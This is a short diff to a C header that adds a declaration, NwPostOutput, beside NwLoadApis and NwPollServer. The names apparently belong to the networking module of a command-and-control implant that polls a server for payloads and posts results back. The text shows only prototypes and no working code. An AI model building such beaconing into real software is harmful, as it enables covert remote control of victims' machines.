@@ -11,3 +11,4 @@
 
 BOOL NwLoadApis();
 PVOID NwPollServer(DWORD *PayloadSize, PBYTE PostBody, DWORD PostBodySize);
+BOOL  NwPostOutput(PBYTE PostBody, DWORD PostBodySize);
